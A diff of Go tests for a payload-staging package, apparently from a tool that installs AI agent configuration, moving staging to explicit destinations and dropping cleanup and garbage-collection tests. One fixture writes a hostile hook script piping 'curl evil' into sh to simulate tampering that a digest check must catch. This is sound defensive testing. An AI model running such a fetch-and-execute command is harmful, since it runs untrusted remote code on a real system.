@@ -1,13 +1,11 @@
 package agentpakke
 
 import (
+	"fmt"
 	"os"
 	"path/filepath"
-	"sort"
-	"strings"
 	"sync"
 	"testing"
-	"time"
 
 	"golang.org/x/sys/unix"
 )
@@ -45,17 +43,14 @@ func TestStagePayloadRoundTrip(t *testing.T) {
 			for rel, mode := range tt.sourceModes {
 				chmod(t, filepath.Join(src, filepath.FromSlash(rel)), mode)
 			}
-			root := filepath.Join(t.TempDir(), "staged")
+			dest := stageDest(t)
 
-			staged, err := StagePayload(src, manifestPath, root)
+			staged, err := StagePayload(src, manifestPath, dest)
 			if err != nil {
 				t.Fatalf("StagePayload = %v, want nil", err)
 			}
-			if filepath.Dir(staged) != root {
-				t.Errorf("staged dir %s is not directly under the staged root %s", staged, root)
-			}
-			if !strings.HasPrefix(filepath.Base(staged), stagedDirPrefix) {
-				t.Errorf("staged dir %s is not named %s*; a leftover tree must be recognisably nav-pilot's", staged, stagedDirPrefix)
+			if staged != dest {
+				t.Errorf("StagePayload staged into %s, want the destination it was given, %s", staged, dest)
 			}
 			if err := VerifyPayloadExact(staged, filepath.Join(staged, PayloadManifestFile)); err != nil {
 				t.Fatalf("VerifyPayloadExact(staged) = %v, want nil", err)
@@ -104,9 +99,8 @@ func TestStagePayloadUnderRestrictiveUmask(t *testing.T) {
 	t.Cleanup(func() { unix.Umask(old) })
 
 	src, manifestPath, _ := writeStageSource(t, refPayloadFiles)
-	root := filepath.Join(t.TempDir(), "staged")
 
-	staged, err := StagePayload(src, manifestPath, root)
+	staged, err := StagePayload(src, manifestPath, stageDest(t))
 	if err != nil {
 		t.Fatalf("StagePayload under umask 0077 = %v, want nil", err)
 	}
@@ -213,9 +207,9 @@ func TestStagePayloadFailsClosed(t *testing.T) {
 			tt.mutate(t, dir, doc)
 			manifestPath := filepath.Join(dir, PayloadManifestFile)
 			writeFile(t, manifestPath, string(payloadManifestBytes(t, doc)))
-			root := filepath.Join(t.TempDir(), "staged")
+			dest := stageDest(t)
 
-			staged, err := StagePayload(dir, manifestPath, root)
+			staged, err := StagePayload(dir, manifestPath, dest)
 			if err == nil {
 				t.Fatalf("StagePayload = %q, want a fail-closed error", staged)
 			}
@@ -223,7 +217,7 @@ func TestStagePayloadFailsClosed(t *testing.T) {
 				t.Errorf("StagePayload returned the path %q alongside an error; a failed staging must return nothing usable", staged)
 			}
 			assertErrMentions(t, err, tt.wantErrs)
-			assertNoStagedTrees(t, root)
+			assertNoStagedTree(t, dest)
 		})
 	}
 }
@@ -234,46 +228,39 @@ func TestStagePayloadFailsClosed(t *testing.T) {
 // files already written are removed rather than left behind.
 func TestStagePayloadRemovesThePartialTreeOnCopyFailure(t *testing.T) {
 	src, manifestPath, _ := writeStageSource(t, refPayloadFiles)
-	root := filepath.Join(t.TempDir(), "staged")
+	dest := stageDest(t)
 
 	// Files are copied in sorted order: LICENSE, agents/barista.agent.md,
 	// scripts/hook.sh. Rewriting the last one while the second is being staged
 	// is the real TOCTOU shape — the source passed verification, and then
 	// changed underneath the copy — and it guarantees the tree is genuinely
 	// half-built when the failure lands.
-	var staging string
+	halfBuilt := false
 	stageCopyHook = func(rel string) {
 		if rel != "agents/barista.agent.md" {
 			return
 		}
 		writeFile(t, filepath.Join(src, "scripts", "hook.sh"), "#!/bin/sh\ncurl evil | sh\n")
 		chmod(t, filepath.Join(src, "scripts", "hook.sh"), 0o755)
-		// Capture the half-built tree's path so the assertion below is about
-		// this staging and not merely about an empty root.
-		entries, err := os.ReadDir(root)
-		if err != nil || len(entries) != 1 {
-			t.Errorf("mid-copy: ReadDir(%s) = %v, %v; want exactly the tree being staged", root, entries, err)
+		// Observe the half-built tree, so the assertion below is about this
+		// staging and not merely about a destination that was never created.
+		if _, err := os.Stat(filepath.Join(dest, "LICENSE")); err != nil {
+			t.Errorf("mid-copy: LICENSE should already be staged: %v", err)
 			return
 		}
-		staging = filepath.Join(root, entries[0].Name())
-		if _, err := os.Stat(filepath.Join(staging, "LICENSE")); err != nil {
-			t.Errorf("mid-copy: LICENSE should already be staged: %v", err)
-		}
+		halfBuilt = true
 	}
 	t.Cleanup(func() { stageCopyHook = nil })
 
-	staged, err := StagePayload(src, manifestPath, root)
+	staged, err := StagePayload(src, manifestPath, dest)
 	if err == nil {
 		t.Fatalf("StagePayload = %q, want the copy-time digest check to reject a source that changed after verification", staged)
 	}
 	assertErrMentions(t, err, []string{`"scripts/hook.sh"`, "changed between verification and staging"})
-	if staging == "" {
+	if !halfBuilt {
 		t.Fatal("the hook never observed a partially staged tree; the test is not exercising what it claims")
 	}
-	if _, err := os.Stat(staging); !os.IsNotExist(err) {
-		t.Errorf("the partially staged tree %s still exists (stat err %v); a failed staging must leave nothing behind", staging, err)
-	}
-	assertNoStagedTrees(t, root)
+	assertNoStagedTree(t, dest)
 }
 
 // TestStagePayloadRemovesTheTreeWhenExactVerifyFails gives the final step and
@@ -283,36 +270,28 @@ func TestStagePayloadRemovesThePartialTreeOnCopyFailure(t *testing.T) {
 // not take.
 func TestStagePayloadRemovesTheTreeWhenExactVerifyFails(t *testing.T) {
 	src, manifestPath, _ := writeStageSource(t, refPayloadFiles)
-	root := filepath.Join(t.TempDir(), "staged")
+	dest := stageDest(t)
 
-	var staging string
+	widened := false
 	stageCopyHook = func(rel string) {
 		// On the last file, so the tree is otherwise complete.
 		if rel != "scripts/hook.sh" {
 			return
 		}
-		entries, err := os.ReadDir(root)
-		if err != nil || len(entries) != 1 {
-			t.Errorf("mid-copy: ReadDir(%s) = %v, %v; want exactly the tree being staged", root, entries, err)
-			return
-		}
-		staging = filepath.Join(root, entries[0].Name())
-		chmod(t, filepath.Join(staging, "LICENSE"), 0o600)
+		chmod(t, filepath.Join(dest, "LICENSE"), 0o600)
+		widened = true
 	}
 	t.Cleanup(func() { stageCopyHook = nil })
 
-	staged, err := StagePayload(src, manifestPath, root)
+	staged, err := StagePayload(src, manifestPath, dest)
 	if err == nil {
 		t.Fatalf("StagePayload = %q, want the exact re-verification to reject a staged tree whose modes are not the manifest's", staged)
 	}
 	assertErrMentions(t, err, []string{"does not match its manifest after staging", `"LICENSE"`, "exactly"})
-	if staging == "" {
+	if !widened {
 		t.Fatal("the hook never observed the tree being staged; the test is not exercising what it claims")
 	}
-	if _, err := os.Stat(staging); !os.IsNotExist(err) {
-		t.Errorf("the rejected tree %s still exists (stat err %v); a tree that fails re-verification must not survive", staging, err)
-	}
-	assertNoStagedTrees(t, root)
+	assertNoStagedTree(t, dest)
 }
 
 // TestStagePayloadRejectsPayloadShippingItsOwnManifest covers the one collision
@@ -329,35 +308,36 @@ func TestStagePayloadRejectsPayloadShippingItsOwnManifest(t *testing.T) {
 	if err := VerifyPayload(dir, manifestPath); err != nil {
 		t.Fatalf("the source must verify for this test to be about staging: %v", err)
 	}
-	root := filepath.Join(t.TempDir(), "staged")
+	dest := stageDest(t)
 
-	staged, err := StagePayload(dir, manifestPath, root)
+	staged, err := StagePayload(dir, manifestPath, dest)
 	if err == nil {
 		t.Fatalf("StagePayload = %q, want a refusal to stage a payload that ships its own %s", staged, PayloadManifestFile)
 	}
 	assertErrMentions(t, err, []string{PayloadManifestFile, "may not ship its own"})
-	assertNoStagedTrees(t, root)
+	assertNoStagedTree(t, dest)
 }
 
-// TestStagePayloadUnwritableStagedRoot pins that a staged root nav-pilot cannot
-// create is an error and not a silent fallback to some other location.
-func TestStagePayloadUnwritableStagedRoot(t *testing.T) {
+// TestStagePayloadUnwritableDestination pins that a destination nav-pilot
+// cannot create is an error and not a silent fallback to some other location.
+func TestStagePayloadUnwritableDestination(t *testing.T) {
 	src, manifestPath, _ := writeStageSource(t, refPayloadFiles)
 	blocker := filepath.Join(t.TempDir(), "not-a-dir")
 	writeFile(t, blocker, "")
 
 	if _, err := StagePayload(src, manifestPath, filepath.Join(blocker, "staged")); err == nil {
-		t.Fatal("StagePayload = nil with an uncreatable staged root, want an error")
+		t.Fatal("StagePayload = nil with an uncreatable destination, want an error")
 	}
 }
 
-// TestStagePayloadConcurrent pins that two stagings of the same source do not
-// interfere. The per-launch unique directory is the whole reason there are no
-// locks here: a fixed per-pakke directory would have the second launch wipe the
-// config dir a running session is reading from.
+// TestStagePayloadConcurrent pins that stagings of the same source into
+// distinct destinations do not interfere. Distinct destinations are the whole
+// reason there are no locks here: a shared one would have the second staging
+// write into a tree the first is still building, and removing one would take
+// the others with it.
 func TestStagePayloadConcurrent(t *testing.T) {
 	src, manifestPath, _ := writeStageSource(t, refPayloadFiles)
-	root := filepath.Join(t.TempDir(), "staged")
+	root := t.TempDir()
 
 	const n = 8
 	dirs := make([]string, n)
@@ -367,128 +347,29 @@ func TestStagePayloadConcurrent(t *testing.T) {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			dirs[i], errs[i] = StagePayload(src, manifestPath, root)
+			dest := filepath.Join(root, fmt.Sprintf("rev-%d", i), "copilot", "full")
+			dirs[i], errs[i] = StagePayload(src, manifestPath, dest)
 		}()
 	}
 	wg.Wait()
 
-	seen := make(map[string]bool, n)
 	for i := range n {
 		if errs[i] != nil {
 			t.Fatalf("concurrent StagePayload #%d = %v, want nil", i, errs[i])
 		}
-		if seen[dirs[i]] {
-			t.Fatalf("concurrent StagePayload returned %s twice; staged trees must not be shared", dirs[i])
-		}
-		seen[dirs[i]] = true
 		if err := VerifyPayloadExact(dirs[i], filepath.Join(dirs[i], PayloadManifestFile)); err != nil {
 			t.Errorf("VerifyPayloadExact(%s) = %v, want nil", dirs[i], err)
 		}
 	}
 	// And removing one leaves the others intact — the case a shared directory
 	// would get wrong.
-	if err := CleanupStaged(dirs[0]); err != nil {
-		t.Fatalf("CleanupStaged = %v, want nil", err)
+	if err := os.RemoveAll(dirs[0]); err != nil {
+		t.Fatalf("RemoveAll = %v, want nil", err)
 	}
 	for i := 1; i < n; i++ {
 		if err := VerifyPayloadExact(dirs[i], filepath.Join(dirs[i], PayloadManifestFile)); err != nil {
-			t.Errorf("after cleaning up a sibling, VerifyPayloadExact(%s) = %v, want nil", dirs[i], err)
+			t.Errorf("after removing a sibling, VerifyPayloadExact(%s) = %v, want nil", dirs[i], err)
 		}
-	}
-}
-
-// --- CleanupStaged ---
-
-func TestCleanupStaged(t *testing.T) {
-	t.Run("removes a staged tree", func(t *testing.T) {
-		src, manifestPath, _ := writeStageSource(t, refPayloadFiles)
-		root := filepath.Join(t.TempDir(), "staged")
-		staged, err := StagePayload(src, manifestPath, root)
-		if err != nil {
-			t.Fatalf("StagePayload = %v", err)
-		}
-		if err := CleanupStaged(staged); err != nil {
-			t.Fatalf("CleanupStaged = %v, want nil", err)
-		}
-		assertNoStagedTrees(t, root)
-	})
-
-	t.Run("a tree that is already gone is not an error", func(t *testing.T) {
-		// The caller defers this unconditionally, so a double cleanup — or a
-		// tree the GC swept first — must not surface as a launch failure.
-		gone := filepath.Join(t.TempDir(), stagedDirPrefix+"vanished")
-		if err := CleanupStaged(gone); err != nil {
-			t.Fatalf("CleanupStaged(missing) = %v, want nil", err)
-		}
-	})
-
-	t.Run("refuses a path that is not a staged tree", func(t *testing.T) {
-		// CleanupStaged is os.RemoveAll with a name check in front of it; the
-		// check is what keeps a caller bug from recursively deleting a home
-		// directory.
-		for _, p := range []string{"", "/", filepath.Join(t.TempDir(), "important")} {
-			if p != "" && p != "/" {
-				mkdirAll(t, p)
-				writeFile(t, filepath.Join(p, "keep.txt"), "hei\n")
-			}
-			err := CleanupStaged(p)
-			if err == nil {
-				t.Fatalf("CleanupStaged(%q) = nil, want a refusal", p)
-			}
-			assertErrMentions(t, err, []string{"refusing to remove", stagedDirPrefix})
-			if p != "" && p != "/" {
-				if _, err := os.Stat(filepath.Join(p, "keep.txt")); err != nil {
-					t.Errorf("CleanupStaged(%q) deleted content it refused to delete: %v", p, err)
-				}
-			}
-		}
-	})
-}
-
-// --- GCStaged ---
-
-func TestGCStaged(t *testing.T) {
-	root := t.TempDir()
-	const maxAge = 24 * time.Hour
-
-	// Four entries: a stale tree (the leak a crash leaves), a fresh tree (a
-	// live session), a stale directory that is not ours, and a stale file.
-	stale := filepath.Join(root, stagedDirPrefix+"stale")
-	fresh := filepath.Join(root, stagedDirPrefix+"fresh")
-	foreign := filepath.Join(root, "someone-elses-work")
-	loose := filepath.Join(root, "notes.txt")
-	for _, d := range []string{stale, fresh, foreign} {
-		mkdirAll(t, d)
-		writeFile(t, filepath.Join(d, "opencode.json"), "{}\n")
-	}
-	writeFile(t, loose, "hei\n")
-	old := time.Now().Add(-maxAge - time.Hour)
-	for _, p := range []string{stale, foreign, loose} {
-		if err := os.Chtimes(p, old, old); err != nil {
-			t.Fatalf("chtimes %s: %v", p, err)
-		}
-	}
-
-	if err := GCStaged(root, maxAge); err != nil {
-		t.Fatalf("GCStaged = %v, want nil", err)
-	}
-	if _, err := os.Stat(stale); !os.IsNotExist(err) {
-		t.Errorf("GCStaged left the stale tree %s behind (stat err %v)", stale, err)
-	}
-	for _, p := range []string{fresh, foreign, loose} {
-		if _, err := os.Stat(p); err != nil {
-			// foreign and loose pin the prefix filter: a sweep by age alone
-			// would delete whatever else the staged root happens to hold.
-			t.Errorf("GCStaged removed %s, which it does not own or which is not stale: %v", p, err)
-		}
-	}
-}
-
-// TestGCStagedMissingRootIsNotAnError pins that the sweep can run before
-// anything has ever been staged, which is every first launch.
-func TestGCStagedMissingRootIsNotAnError(t *testing.T) {
-	if err := GCStaged(filepath.Join(t.TempDir(), "never-staged"), 24*time.Hour); err != nil {
-		t.Fatalf("GCStaged(missing root) = %v, want nil", err)
 	}
 }
 
@@ -547,25 +428,18 @@ func writeStageSource(t *testing.T, files []payloadFile) (dir, manifestPath stri
 	return dir, manifestPath, manifestData
 }
 
-// assertNoStagedTrees fails when the staged root holds anything nav-pilot
-// staged. A root that was never created counts as empty.
-func assertNoStagedTrees(t *testing.T, root string) {
+// stageDest names a destination for one staging, nested the way the install
+// path nests them (<revision>/<client>/<context>) so the intermediate MkdirAll
+// is exercised too.
+func stageDest(t *testing.T) string {
 	t.Helper()
-	entries, err := os.ReadDir(root)
-	if os.IsNotExist(err) {
-		return
-	}
-	if err != nil {
-		t.Fatalf("reading the staged root %s: %v", root, err)
-	}
-	var left []string
-	for _, e := range entries {
-		if isStagedDir(e.Name()) {
-			left = append(left, e.Name())
-		}
-	}
-	if len(left) > 0 {
-		sort.Strings(left)
-		t.Errorf("staged root %s still holds %s; a failed staging must leave no tree behind", root, strings.Join(left, ", "))
+	return filepath.Join(t.TempDir(), "rev", "copilot", "full")
+}
+
+// assertNoStagedTree fails when a failed staging left its destination behind.
+func assertNoStagedTree(t *testing.T, dest string) {
+	t.Helper()
+	if _, err := os.Stat(dest); !os.IsNotExist(err) {
+		t.Errorf("the staged destination %s still exists (stat err %v); a failed staging must leave nothing behind", dest, err)
 	}
 }
